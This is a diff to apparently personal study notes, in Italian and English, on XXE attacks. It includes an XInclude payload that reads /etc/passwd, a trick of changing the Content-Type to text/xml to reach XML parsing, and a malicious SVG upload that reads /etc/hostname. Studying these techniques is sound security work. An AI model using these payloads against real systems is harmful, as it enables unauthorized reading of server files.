@@ -41,5 +41,35 @@ non è possibile fare il classico attacco modificando il DOCTYPE
 è però possibile usare XInclude, parte della specifica XML che consente ai documenti XML di essere buildati da altri sotto documenti.
 XInclude può essere messo in qualsiasi data value
 
+da inserire al posto di un valore del parametro della richiesta:
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+XXE attacks via MODIFIED CONTENT TYPE
+
+For example, if a normal request contains the following:
+        
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+
+Then you might be able submit the following request, with the same result:
+        
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+
+If the application tolerates requests containing XML in the 
+message body, and parses the body content as XML, then you can reach the
+ hidden XXE attack surface simply by reformatting requests to use the 
+XML format.
+
+XXE VIA FILE UPLOAD
+Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
+
+esempio di file SVG 
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>        
